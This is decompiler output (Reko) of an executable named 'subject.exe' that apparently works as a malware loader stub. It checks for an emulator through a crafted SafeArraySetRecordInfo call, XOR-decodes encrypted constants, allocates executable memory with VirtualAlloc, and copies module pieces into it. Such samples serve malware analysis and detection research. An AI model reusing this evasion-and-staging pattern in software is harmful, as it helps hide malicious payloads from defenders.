// subject_CODE.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: void fn13101000(Stack ptr32 dwArg04, Stack (ptr32 byte) dwArg08, Stack word32 dwArg0C, Stack (ptr32 word32) dwArg10, Stack ui32 dwArg14, Stack (arr byte) dwArg18)
// Called from:
//      Win32CrtStartup
void fn13101000(ptr32 dwArg04, byte * dwArg08, word32 dwArg0C, word32 * dwArg10, ui32 dwArg14, byte dwArg18[])
{
	*dwArg10 = dwArg0C;
	word16 wLoc0C_77 = (word16) ((uint64) dwArg14 % 0x05);
	byte * dwArg04_79 = dwArg04 + dwArg14;
	while (true)
	{
		--dwArg0C;
		if (dwArg0C == 0x00)
			break;
		*dwArg08 = *dwArg04_79 ^ dwArg18[(int32) wLoc0C_77];
		++wLoc0C_77;
		if ((int32) wLoc0C_77 == 0x05)
			wLoc0C_77 = 0x00;
		++dwArg08;
		++dwArg04_79;
	}
}

// 131010A0: Register Eq_42 Win32CrtStartup()
Eq_42 Win32CrtStartup()
{
	ptr32 fp;
	struct Eq_44 * ecx;
	Eq_45 tLoc0238;
	Eq_46 tLoc10;
	if (SafeArraySetRecordInfo(null, (IRecordInfo *) 0x00093474) == 0x80070057)
	{
		GetACP();
		word32 ecx_41 = g_dw13102000;
		fn13101000(fp - 40, fp - 40, 0x04, &tLoc10, 0x00, fp - 0x0234);
		word32 ecx_69 = g_dw13102004;
		fn13101000(fp - 0x025C, fp - 600, 0x04, &tLoc10, 0x04, fp - 0x0234);
		ui32 ecx_99 = g_dw13102008;
		fn13101000(fp - 0x1C, fp - 20, 0x04, &tLoc10, 0x08, fp - 0x0234);
		Eq_102 eax_133 = GetModuleHandleA(null);
		word32 eax_141 = g_dw1310200C;
		fn13101000(fp - 0x28, fp - 28, 0x04, &tLoc10, 0x0C, fp - 0x0234);
		ui32 dwLoc0248_498 = g_dw13102010;
		fn13101000(fp - 600, fp - 0x0248, 0x04, &tLoc10, 0x10, fp - 0x0234);
		ui32 ecx_218 = ecx_99 * 0x08 + 0x0C;
		ui32 dwLoc0250_505 = 0x14;
		word32 * dwLoc24_506 = &g_dw13102014;
		Eq_145 eax_231 = VirtualAlloc(0x00, ecx_218 + ecx_69 + ecx_41, 0x3000, 0x40);
		byte * dwLoc0C_513 = eax_133 + eax_141 / 4 + ecx_218 / 4;
		ui32 dwLoc0264_515 = ecx_218;
		ui32 dwLoc08_516 = 0x00;
		Eq_164 dwLoc18_517 = 0x00;
		while (true)
		{
			if (dwLoc0264_515 == dwLoc0248_498)
			{
				++dwLoc08_516;
				if (dwLoc08_516 == ecx_99)
					;
				word32 edx_261 = *dwLoc24_506;
				fn13101000(fp - 28 - dwLoc0250_505, fp - 28, 0x04, &tLoc10, dwLoc0250_505, fp - 0x0234);
				ui32 * dwLoc24_535 = dwLoc24_506 + 1;
				ui32 dwLoc0250_534 = dwLoc0250_505 + 0x04;
				dwLoc0248_498 = *dwLoc24_535;
				fn13101000(fp - 0x0248 - dwLoc0250_534, fp - 0x0248, 0x04, &tLoc10, dwLoc0250_534, fp - 0x0234);
				dwLoc0250_505 = dwLoc0250_534 + 0x04;
				dwLoc24_506 = dwLoc24_535 + 1;
				dwLoc0264_515 = 0x00;
				dwLoc0C_513 = (byte *) (eax_133 + edx_261 / 4);
			}
			Mem348[eax_231 + dwLoc18_517:byte] = Mem343[dwLoc0C_513 + 0x00:byte];
			++dwLoc0C_513;
			++dwLoc18_517;
			++dwLoc0264_515;
		}
	}
	else
	{
		Eq_42 eax_440;
		ecx->ptr0028();
		return eax_440;
	}
}

// subject_DATA.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw13102000 = 0x04FF525E; // 13102000
word32 g_dw13102004 = ~0x00958142; // 13102004
ui32 g_dw13102008 = 0x6A5E2D06; // 13102008
word32 g_dw1310200C = 1580016895; // 1310200C
ui32 g_dw13102010 = 0x2D04EEDC; // 13102010
word32 g_dw13102014 = 0x04FE5A5E; // 13102014
// subject_idata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw13111050 = 0x000110D0; // 13111050
word32 g_dw13111054 = 0x000110E4; // 13111054
word32 g_dw13111058 = 69886; // 13111058
word32 g_dw13111060 = 0x00011122; // 13111060
word32 g_dw13111064 = 0x00011132; // 13111064
word32 g_dw13111068 = 0x00011142; // 13111068
word32 g_dw1311106C = 0x0001114C; // 1311106C
word32 g_dw13111070 = 0x00011160; // 13111070
word32 g_dw13111074 = 0x0001116E; // 13111074
word32 g_dw1311107C = 0x0001118C; // 1311107C
word32 g_dw13111080 = 0x00011194; // 13111080
word32 g_dw13111084 = 0x0001119E; // 13111084
word32 g_dw13111088 = 0x000111A8; // 13111088
<anonymous> * __imp__CreateStdDispatch = &g_t110D0; // 13111090
<anonymous> * __imp__SafeArraySetRecordInfo = &g_t110E4; // 13111094
<anonymous> * __imp__VarNumFromParseNum = &g_t110FE; // 13111098
<anonymous> * __imp__FindResourceA = &g_t11122; // 131110A0
<anonymous> * __imp__VirtualAlloc = &g_t11132; // 131110A4
<anonymous> * __imp__GetACP = &g_t11142; // 131110A8
<anonymous> * __imp__GetModuleHandleA = &g_t1114C; // 131110AC
<anonymous> * __imp__ExitProcess = &g_t11160; // 131110B0
<anonymous> * __imp__LockResource = &g_t1116E; // 131110B4
<anonymous> * __imp___cabs = &g_t1118C; // 131110BC
<anonymous> * __imp___assert = &g_t11194; // 131110C0
<anonymous> * __imp___chdir = &g_t1119E; // 131110C4
<anonymous> * __imp___access = &g_t111A8; // 131110C8
